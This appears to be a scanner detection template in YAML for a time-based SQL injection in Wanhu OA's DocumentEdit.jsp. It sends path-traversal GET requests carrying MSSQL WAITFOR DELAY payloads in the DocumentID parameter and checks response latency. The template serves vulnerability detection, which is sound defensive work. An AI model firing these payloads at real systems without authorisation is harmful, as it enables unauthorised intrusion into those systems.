id: wanhu-oa-documentedit-sqli

info:
  name: 万户OA DocumentEdit.jsp SQL注入漏洞
  author: zan8in
  severity: high
  verified: true
  tags: wanhu,sqli
  created: 2023/12/08

rules:
  r0:
    request:
      method: GET
      path: /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../public/iSignatureHTML.jsp/DocumentEdit.jsp?DocumentID=1
    expression: response.status == 200
    output: 
      t0: response.latency
  r1:
    request:
      method: GET
      path: /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../public/iSignatureHTML.jsp/DocumentEdit.jsp?DocumentID=1';WAITFOR DELAY '0:0:5'--
    expression: response.status == 200 && response.latency - t0 >= 4500
  r2:
    request:
      method: GET
      path: /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../public/iSignatureHTML.jsp/DocumentEdit.jsp?DocumentID=1';WAITFOR DELAY '0:0:3'--
    expression: response.status == 200 && response.latency - t0 >= 2500
  r3:
    request:
      method: GET
      path: /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../public/iSignatureHTML.jsp/DocumentEdit.jsp?DocumentID=1';WAITFOR DELAY '0:0:5'--
    expression: response.status == 200 && response.latency - t0 >= 4500
expression: r0() && r1() && r2() && r3()
